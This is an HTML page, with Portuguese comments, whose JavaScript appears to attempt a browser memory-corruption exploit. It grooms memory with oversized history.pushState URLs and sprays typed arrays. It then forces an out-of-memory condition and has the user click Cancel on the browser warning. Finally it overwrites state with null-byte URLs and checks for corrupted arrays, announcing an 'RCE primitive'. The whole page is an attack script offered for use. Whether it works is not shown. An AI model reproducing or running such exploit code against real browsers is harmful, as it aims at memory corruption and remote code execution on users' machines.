<!DOCTYPE html>
<html>
<head>
    <title>Magic OOM Trigger (46k Original)</title>
    <style>
        body { background-color: #220000; color: #ff5555; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #ff0000; padding: 10px; height: 450px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px; background: #000;}
        .btn { 
            padding: 20px; font-size: 1.3em; cursor: pointer; 
            background: #400; color: #fff; border: 2px solid #f00; margin: 10px 0; width: 100%; font-weight: bold;
        }
        .btn:hover { background: #600; }
        .win { background-color: #00ff00; color: #000; font-weight: bold; padding: 5px; border: 2px solid #fff; font-size: 1.2em;}
    </style>
</head>
<body>

<h1>OOM Trigger: O Gatilho do Cancelar</h1>
<p>Meta: Provocar o alerta de memória e clicar em CANCELAR para forçar o ataque.</p>

<button class="btn" onclick="runSequence()">INICIAR SEQUÊNCIA TOTAL</button>

<div id="log">Pronto. Preparado para estressar.</div>

<script>
    const BASE_OFFSET = 709522; 
    var victims = []; 

    function log(msg, type='') {
        const el = document.getElementById('log');
        const color = type === 'win' ? '#ffff00' : '#ff5555';
        el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }

    async function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

    function makeGroomPayload(size) {
        let s = "";
        for(let i=0; i<size; i++) s += String.fromCharCode((i % 32) + 1);
        return s;
    }

    async function runSequence() {
        victims = [];
        log("=== FASE 1: RECRIANDO OS TESTES 6-3-1 ===", 'win');
        
        // VOLTANDO AOS VALORES ORIGINAIS (46000+)
        const MAX_SIZE = 48000; 
        
        try {
            // Incremento de 2000 para criar a "escada" de memória
            for(let size = 1000; size <= MAX_SIZE; size += 2000) {
                
                // Grooming (Histórico)
                let payload = "/" + "A".repeat(BASE_OFFSET) + makeGroomPayload(size);
                
                try {
                    history.pushState({}, `groom_${size}`, payload);
                } catch(e) {
                    log(`[!] Erro no pushState (${size}): ${e.message}`);
                    // Se der erro aqui, continuamos, pois a memória está cheia
                }
                
                // VÍTIMAS (Shotgun Spray)
                // Usamos Uint32Array pois são fáceis de detectar corrupção
                let v = new Uint32Array(32); 
                v.fill(0x13371337); 
                v.tag = size;
                victims.push(v);

                if(size % 5000 === 0) {
                    log(`    ...${size} bytes alocados.`);
                    await wait(10); 
                }
            }
        } catch(e) {
            log(`[!] Loop interrompido: ${e.message}`);
        }

        log("=== FASE 2: PROVOCANDO O ALERTA (OOM) ===");
        log("Atenção: O navegador vai travar e pedir para parar.");
        log(">>> CLIQUE EM 'CANCELAR' OU 'AGUARDAR' <<<", 'win');
        
        await wait(1000);

        // OOM GENERATOR
        // Aloca strings gigantes até o sistema gritar
        try {
            let pressure = [];
            for(let i=0; i<500; i++) {
                pressure.push(new ArrayBuffer(1024 * 1024 * 5)); // 5MB chunks
                if(i % 10 === 0) {
                    history.replaceState({}, `pressure_${i}`, "/A"); // Touch history
                    await wait(5); // Dá chance da janela aparecer
                }
            }
        } catch(e) {
            log("[!] OOM atingido/Janela apareceu? (" + e.message + ")", 'win');
        }

        // Se o usuário clicou em CANCELAR, o script continua aqui.
        // A memória acabou de ser compactada violentamente.
        
        log("=== FASE 3: O ATAQUE IMEDIATO ===", 'win');
        await attack();
    }

    async function attack() {
        let success = false;
        
        try {
            let buffer = "A".repeat(BASE_OFFSET);
            let attack = "\x00".repeat(128); // 128 Zeros
            
            // Rajada de replaceState no momento crítico
            for(let k=0; k<20; k++) {
                history.replaceState({}, `PWN_${k}`, "/" + buffer + attack);
            }
            
            log("Verificando se houve corrupção...");
            
            // VERIFICAÇÃO REVERSA (Do mais recente para o antigo)
            for(let i=victims.length - 1; i >= 0; i--) {
                let v = victims[i];
                if (!v) continue;

                // 1. Checa Tamanho
                if (v.length !== 32) {
                    log(`!!! JACKPOT !!! Vítima ${i} TAMANHO MUDOU: ${v.length}`, 'win');
                    success = true;
                }
                
                // 2. Checa Conteúdo
                if (v[0] !== 0x13371337) {
                    log(`!!! JACKPOT !!! Vítima ${i} CONTEÚDO ZERADO! Valor: 0x${v[0].toString(16)}`, 'win');
                    success = true;
                }

                if (success) {
                    document.body.style.backgroundColor = "#004400";
                    alert("RCE PRIMITIVE UNLOCKED!\nCorrupção detectada após o OOM!");
                    break;
                }
            }
            
            if(!success) {
                log("[-] Payload escrito, mas sem corrupção detectada.");
                log("    Tente novamente. A 'sorte' depende de quando você clica em Cancelar.");
            }

        } catch(e) {
            log(`[!] Erro no ataque: ${e.message}`);
        }
    }
</script>
</body>
</html>
